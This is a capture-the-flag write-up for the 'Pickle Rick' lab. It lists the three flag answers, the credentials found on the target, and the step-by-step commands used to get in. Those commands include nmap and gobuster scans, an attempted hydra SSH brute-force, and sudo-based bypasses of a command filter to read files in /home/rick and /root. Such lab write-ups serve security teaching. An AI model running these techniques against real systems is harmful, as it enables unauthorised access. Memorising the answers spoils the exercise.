# Pickle Rick 🥒

**Date:** 04.02.2025  
**Difficulty:** Easy

---

## Questions and Answers ✅

1. **What is the first ingredient that Rick needs?**  
   `mr. meeseek hair`
2. **What is the second ingredient in Rick’s potion?**  
   `1 jerry tear`
3. **What is the last and final ingredient?**  
   `fleeb juice`

---

## Obtained Information 🔍

- **Target IP Address:** `<IP_ADDRESS>`
- **Rick's Username:** `R1ckRul3s`
- **Password found inside robots.txt:** `Wubbalubbadubdub`

---

## Process 🕵️‍♂️

### **1. Scanning the target with Nmap**

```bash
nmap -sV <IP_ADDRESS>
```

**Results:**

- Open ports: `22 (SSH)`, `80 (HTTP)`

### **2. Exploring the Website**

Rick left a message for Morty:

```text
Help Morty!
Listen Morty... I need your help, I've turned myself into a pickle again...
I have no idea what the password was! Help Morty, Help!
```

### **3. Inspecting Source Code**

Found a hidden comment with a username:

```html
<!-- Note to self, remember username! Username: R1ckRul3s -->
```

### **4. Attempting SSH Brute-Force (Failed)**

```bash
hydra -l R1ckRul3s -P ./Tools/wordlists/rockyou.txt "ssh://<IP_ADDRESS>"
```

**Error:**

```bash
Permission denied (publickey).
```

SSH does not support password authentication.

### **5. Enumerating Directories with Gobuster**

```bash
gobuster dir -u "http://<IP_ADDRESS>" -w ./Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -r
```

**Results:**

- `/assets` (Status: 200) ✅
- `/server-status` (Status: 403)

Checked `/assets`, found images and JavaScript files, but no useful metadata.

### **6. Finding Hidden Credentials in robots.txt**

A file named `robots.txt.tmp` contained the password:

```text
Wubbalubbadubdub
```

### **7. Searching for Login Pages**

Running Gobuster again with `.php` extension:

```bash
gobuster dir -u "http://<IP_ADDRESS>" -w ./Tools/wordlists/dirbuster/directory-list-2.3-small.txt -x .js,.php
```

**Results:**

- `/login.php` (Status: 200) ✅
- `/portal.php` (Status: 302)

### **8. Logging in and Exploring the System**

Using obtained credentials, I accessed a command panel. Running `ls` revealed a file:

```
Sup3rS3cretPickl3Ingred.txt
```

Tried `cat` but it was restricted. Instead, accessed it via the browser:

```bash
http://<IP_ADDRESS>/Sup3rS3cretPickl3Ingred.txt
```

✅ First ingredient found!

### **9. Finding the Second Ingredient**

A `clue.txt` file provided a hint:

```text
Look around the file system for the other ingredient.
```

Found `second ingredient` in `/home/rick/`, but `cat` was blocked. Used:

```bash
while read line; do echo $line; done <../../../home/rick/"second ingredients"
```

✅ Second ingredient found!

### **10. Finding the Third Ingredient (Root Access Needed)**

A file named `3rd.txt` was in `/root`. Used `sudo` to list contents:

```bash
sudo ls ../../../root
```

Then, bypassed `cat` restriction with:

```bash
sudo nl ../../../root/3rd.txt
```

✅ Third ingredient found!

```text
3rd ingredient: fleeb juice
```

---

## Reflection & Questions for Further Research 🤔💡

- What does `Permission denied (publickey).` mean when using SSH?

---

## Summary & Takeaways 📌📖

- **Inspecting robots.txt** can reveal sensitive information.
- **Gobuster with `-x` (extensions)** helps detect hidden `.php` pages.
- **`sudo` and alternative command-line tools (`nl`, `while read`)** help bypass restrictions.
- **Enumerating files manually in `/home` and `/root`** can lead to critical discoveries.

🚀 Another successful CTF completed! On to the next one! 💪
